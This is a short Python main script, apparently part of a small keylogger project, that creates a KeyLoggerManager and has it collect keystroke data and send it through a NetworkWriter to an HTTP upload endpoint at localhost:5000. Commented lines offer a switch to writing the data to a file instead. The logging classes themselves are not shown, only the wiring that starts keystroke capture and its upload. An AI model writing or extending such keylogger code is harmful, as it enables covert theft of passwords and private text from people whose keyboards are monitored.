from keyLoggerManager import KeyLoggerManager
from fileWriter import FileWriter
from networkWriter import NetworkWriter

def main():
    manager = KeyLoggerManager(10, NetworkWriter("http://127.0.0.1:5000/api/upload"))
    manager.collect_data()

if __name__ == "__main__":
    main()

#NetworkWriter("http://127.0.0.1:5000/api/upload")
#FileWriter()